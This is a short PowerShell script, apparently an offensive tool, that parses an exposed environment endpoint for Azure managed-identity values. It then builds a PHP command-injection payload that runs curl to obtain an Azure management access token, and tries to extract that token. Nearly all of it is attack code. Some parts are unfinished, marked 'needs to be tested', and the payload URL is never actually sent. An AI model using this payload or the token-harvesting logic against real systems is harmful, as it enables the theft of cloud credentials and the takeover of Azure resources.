param (
    [Parameter(Mandatory=$true)][string]$envendpoint
)

$Request = (Invoke-WebRequest $envendpoint)
$Response = $Request.Content
If ($Response -Match "IDENTITY") {
    Write-Host "Endpoint belongs to a managed identity"
    Write-Host "Extracting Endpoint..."
    $regex = '(?<=POINT=)[\w:/.-]+'
    $Identity_Endpoint = (Select-String -inputObject $Response -Pattern $regex | ForEach-Object {$_.Matches.Value})
    Write-Host "Identity Endpoint found: $Identity_Endpoint [Stored in `$Identity_Endpoint]"
    Write-Host "Extracting Header..."
    $regex = '(?<=IDENTITY_HEADER=)[\w:/.-]+'
    $Identity_Header = (Select-String -InputObject $Response -Pattern $regex | ForEach-Object {$_.Matches.Value})
    Write-Host "Identity Header found:"$Identity_Header "[Stored in `$Identity_Header]"
    #Needs to be tested
    $GetMIToken = $envendpoint + "<?php system('curl `"`$IDENTITY_ENDPOINT?resource=https://management.azure.com&api-version=2017-09-01`" -H secret:`$IDENTITY_HEADER'); ?>"
    Write-Host "Attempting to extract Managed Identity Token..."
    #Need to test this - Uncomment next line and comment line after that once verified it works
    #$IdentityTokenResponse = $GetMIToken.Content
    $IdentityTokenResponse = $Response
    $regex = '(?<=access_token":")[\w-.]+'
    $Identity_Token = (Select-String -InputObject $IdentityTokenResponse -Pattern $regex | ForEach-Object {$_.Matches.Value})
    If ($Identity_Token -match '^eyj') {
        Write-Host "Managed Identity Token: $Identity_Token [Stored in `$Identity_Token]"
    }
    #If $IdentityTokenResponse
    #Add If/Then/Fail
    else {
        Write-Host "Valid Managed Identity Token not found"
    }
}
Else {
    Write-Host "Endpoint does not belong to a managed identity"
}